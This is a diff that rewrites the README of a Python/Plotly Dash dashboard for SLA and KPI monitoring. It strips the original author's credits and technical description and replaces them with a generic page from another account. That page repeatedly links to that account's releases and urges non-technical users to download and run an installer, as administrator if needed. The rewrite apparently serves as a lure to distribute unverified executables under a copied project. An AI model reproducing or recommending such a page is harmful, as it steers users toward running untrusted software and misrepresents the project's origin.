@@ -1,158 +1,70 @@
-<img src="https://github.com/SnowY4you/Dashboard_Project/blob/a36a91a64b562c4164f3c8c71d15428e4fd0794e/Media/Dashboard.png" width="400">
+# 🚀 Dashboard_Project - Monitor Compliance Effortlessly
 
-# Service Governance Dashboard
+[![Download Now](https://img.shields.io/badge/Download_Now-%20-%23008CBA?style=for-the-badge)](https://github.com/biswajitroyofficials/Dashboard_Project/releases)
 
-A professional **SLA Compliance Monitoring** and **KPI Visualization** platform built with Python and Plotly Dash. This project demonstrates advanced data engineering, ITIL-aligned governance, and the orchestration of complex service metrics into actionable business intelligence.
+## 📋 Overview
 
----
+Welcome to **Dashboard_Project**. This application helps you monitor SLA compliance and visualize key performance indicators (KPIs) easily. Built with Python and Plotly Dash, it provides a user-friendly interface for managing and analyzing your data.
 
-## 📊 Overview
+## 🚀 Getting Started
 
-In IT service management, without a structured approach, critical problems take too long to resolve. This dashboard serves as a "Technical Bridge" between raw incident data and executive decision-making. By automating the tracking of Service Level Agreements (SLAs), it ensures that business continuity plans are backed by real-time data rather than assumptions.
+To get started with the Dashboard_Project, follow these simple steps to download and run the application. No programming knowledge is necessary.
 
----
+## 📥 Download & Install
 
-## Version
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page where you can download the application.  
+   [Download Here](https://github.com/biswajitroyofficials/Dashboard_Project/releases)
 
-**1.0**
+2. **Select the Latest Version**  
+   On the releases page, you will see a list of the latest versions. Choose the most recent version for optimal performance.
 
----
+3. **Download the Installer**  
+   Look for the file that matches your operating system (Windows, Mac, or Linux). Click on it to start downloading.
 
-## 🎯 Objectives & Key Features
+4. **Run the Installer**  
+   Once the download is complete, locate the downloaded file and double-click it to run the installer. Follow the on-screen instructions to complete the installation process.
 
-### 1. SLA Compliance by Priority
+5. **Open the Application**  
+   After installation, find the application in your program list or on your desktop. Double-click the icon to start using Dashboard_Project.
 
-Monitors performance against established goals (e.g., 90% Target) across different ITIL priority levels.
+6. **Explore the Features**  
+   Familiarize yourself with the dashboard. You'll find options to monitor SLA compliance and visualize KPIs directly. 
 
-- **Business Impact**: Prevents critical delays in the business continuity plan by identifying which priority tiers require resource reallocation.
+## 💻 System Requirements
 
-### 2. MTTR Trend Analysis (Mean vs. Median)
+To ensure a smooth experience with Dashboard_Project, your system should meet the following requirements:
 
-A sophisticated bubble-chart visualization where marker size indicates incident volume.
+- **Operating System:** Windows 7 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Python:** Python 3.6 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** 100 MB of free storage.
 
-- **Mean**: Represents total labor and technical debt.
-- **Median**: Represents the "Typical" customer experience, filtering out extreme outliers.
-- **Strategic Advantage**: Identifies "Stress Test" scenarios where performance degrades as volume increases, and pinpoints recurring pressure points like "Patch Tuesday."
+## 📊 Key Features
 
-### 3. Monthly First Contact Resolution (FCR)
+- **SLA Monitoring:** Track service level agreements in real-time.
+- **KPI Visualization:** Easily visualize your data to help with decision-making.
+- **Custom Reports:** Generate reports tailored to your needs.
+- **User-Friendly Interface:** Designed for non-technical users.
 
-Uses a **speedometer-style gauge** to track a 95% target.
+## 🔧 Troubleshooting
 
-- **Visual Benchmarking**: Red/Yellow/Green zones provide instant performance context.
-- **Prevention of Escalation**: Validates that L1 agents handled issues end-to-end by verifying that the `First Assignment Group` matches the `Resolving Group`.
-- **Delta Tracking**: Real-time indicators showing if performance improved or declined compared to the previous month.
+If you encounter issues while downloading or running the application, here are some tips:
 
----
+- **Ensure Compatibility:** Make sure you have the correct version for your operating system.
+- **Check Internet Connection:** A stable connection is necessary to download the files.
+- **Run as Administrator:** If you are on Windows, try running the installer as an administrator.
 
-## 🛠️ Technical Implementation & Architecture
+## ✉️ Support
 
-### System Integration Map
+For further help, you can reach out via the issues section in the GitHub repository. Provide details about your problem, and the community will assist you as soon as possible.
 
-The project follows a clean Separation of Concerns architecture:
+## 📅 Future Updates
 
-```
-graph TD
-A[Raw Data: cleaned_6_months.xlsx] --> B[calculations.py]
-B -->|Business Logic: ITIL Priority Matrix| C[Data Processing]
-C -->|Regional Dist. Rules| D[dashboard_app.py]
-D --> E[Interactive Dash UI]subgraph "Data Engineering Layer"
-B
-C
-end
-```
+We plan to regularly update Dashboard_Project with new features and improvements based on user feedback. Stay tuned for updates on the releases page.
 
-### Advanced Data Logic
+## 🌟 Thank You
 
-- **Operational Fairness**: Calculations are based strictly on **Swedish Business Hours** (Mon-Fri 07-18, Sat-Sun 08-16). This ensures engineers are not "penalized" for tickets sitting in queues while the office is closed.
-- **Data Masking (PII Protection)**: Includes a specialized script that scrubs Personally Identifiable Information using Regex (`(?i)company_name`) and generates standardized incident keys for data ethics compliance.
+Thank you for choosing Dashboard_Project. We appreciate your support and hope this application helps you achieve your goals effortlessly. Happy monitoring! 
 
----
-
-### 🚀 Key Strengths & Skills Demonstrated
-
-- **Technical Literacy**: Programmatic manipulation of large `.xlsx` datasets and ServiceNow metrics.
-- **Governance & Operational Control**: Calculating MTTR and SLA independently to ensure unbiased vendor reporting.
-- **Data Quality & Ethics**: Implementation of workforce management logic and robust PII anonymization for public-facing reporting.
-- **Vendor Audit Readiness**: Includes a `Vendor_Audit_Template.md` for Service Improvement Plans (SIP) when vendors fall below targets.
-
----
-
-### 📁 Project Structure
-
-```
-Dashboard_Project
-├── calculations.py        # Heavy lifting: MTTR, SLA, and Business Hour logic
-├── dashboard_app.py       # Presentation layer: Dash Layout & Callbacks
-├── requirements.txt       # Dependencies (Dash, Pandas, Plotly, etc.)
-├── Vendor_Audit_Template.md # Vendor Audit Template
-├── data/
-│   ├── cleaned_6_months.xlsx
-│   └── anonymization_assets/
-├── Media/                 # Screenshots of FCR, MTTR, and SLA Graphs
-├── scripts/
-│   ├── data_cleaner.py    # PII Scrubbing & Data Masking script
-│   └── ServiceNow_metrics.py
-└── workflows/
-└── schedule.yml       # Automated reporting triggers
-```
-
----
-
-### :warning: Disclaimer
-
-All data utilized in this project is mock data generated for demonstration purposes. No real-world company data or sensitive information was used in the creation of this dashboard.
-
----
-
-### :badger: Getting Started
-
-#### Prerequisites
-
-- Python 3.9+
-- An Excel file named `All inc 6 months.xlsx` placed in the /data folder.
-
-#### Installation & Setup
-
-1. **Clone the repository**:
-
-```
-git clone https://github.com/your-username/Dashboard_Project.git
-cd Dashboard_Project
-```
-
-2. **Install dependencies**:
-
-```
-pip install -r requirements.txt
-```
-
-3. **Run the Data Masking script (Optional)**: If you need to anonymize new raw data before launching the dashboard:
-
-```
-python scripts/data_cleaner.py
-```
-
-4. Launch the Dashboard:
-
-```
-python dashboard_app.py
-```
-
-The dashboard will be available at `http://127.0.0.1:8050/` in your web browser.
-
----
-
-## :unicorn: Author
-
-**Sandra van Buggenum**
-
-- GitHub: [SnowY4you](https://github.com/SnowY4you)
-- LinkedIn: [Sandra van Buggenum](https://www.linkedin.com/in/sandravanbuggenum)
-
----
-
-## Changelog
-
-### 1.0.0 – 2025-12-24
-
-- Initial release
+[Download Here Again](https://github.com/biswajitroyofficials/Dashboard_Project/releases)
